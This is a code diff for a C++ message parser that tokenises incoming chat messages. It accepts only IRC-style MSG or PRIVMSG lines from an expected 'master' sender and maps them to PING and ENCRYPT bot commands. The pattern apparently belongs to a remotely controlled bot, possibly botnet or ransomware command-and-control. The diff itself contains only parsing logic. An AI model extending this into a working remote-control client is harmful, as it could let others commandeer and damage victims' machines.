@@ -1,25 +1,44 @@
-#include "MessageParser.h"
+#include "MessageParser.hpp"
 #include "ActionType.hpp"
 
-std::vector<std::string> buildParams(const char* firstParam, const char** otherParams, unsigned int paramCount) {
-    std::vector<std::string> newParams;
-    newParams.push_back(std::string(firstParam));
-
-    for (unsigned int i = 0; i < paramCount; i++) {
-        newParams.push_back(std::string(otherParams[i]));
+std::vector<std::string> buildParams(std::string receivedMessage) {
+    std::vector<std::string> result;
+    std::istringstream iss(receivedMessage);
+    std::string param;
+    while (iss >> param) {
+        result.push_back(param);
     }
-
-    return newParams;
+    return result;
 }
 
+ActionInfo MessageParser::parseMessage(std::string receivedMessage, const char* expectedSender) {
+    std::vector<std::string> messageParams = buildParams(receivedMessage);
 
-ActionInfo MessageParser::parseMessage(const char* firstParam, const char** otherParams, unsigned int paramCount) {
-    std::vector<std::string> messageParams = buildParams(firstParam, otherParams, paramCount);
-    std::string strActionType = messageParams[0];
+    for (int i = 0; i < messageParams.size(); i++) {
+        printf("Param[%d]: %s\n", i, messageParams[i].c_str());
+    }
+
+    if (messageParams.size() < MessageParser::MIN_PARAMS) {
+        return ActionInfo(ActionType::UNKNOWN, std::vector<std::string>());
+    }
+
+    // Ensure that sender is from the master program
+    const char* sender = messageParams[MessageParser::SENDER_IDX].c_str();
+    if (!GeneralUtils::cStrAreEqual(sender, expectedSender)) {
+        return ActionInfo(ActionType::UNKNOWN, std::vector<std::string>()); 
+    }
+
+    const char* msgType = messageParams[MessageParser::MSG_TYPE_IDX].c_str();
+    if (!GeneralUtils::cStrAreEqual(msgType, "MSG") && !GeneralUtils::cStrAreEqual(msgType, "PRIVMSG")) { // Only general messages and private messages can contain bot commands
+        return ActionInfo(ActionType::UNKNOWN, std::vector<std::string>());
+    }
+
+    // Determine what type, if any, the command is
+    const char* strActionType = messageParams[MessageParser::ACTION_TYPE_IDX].c_str();
     ActionType actionType;
-    if (strActionType == "PING") {
+    if (GeneralUtils::cStrAreEqual(strActionType, "PING")) {
         actionType = ActionType::PING;
-    } else if (strActionType == "ENCRYPT") {
+    } else if (GeneralUtils::cStrAreEqual(strActionType, "ENCRYPT")) {
         actionType = ActionType::ENCRYPT;
     } else {
         actionType = ActionType::UNKNOWN;
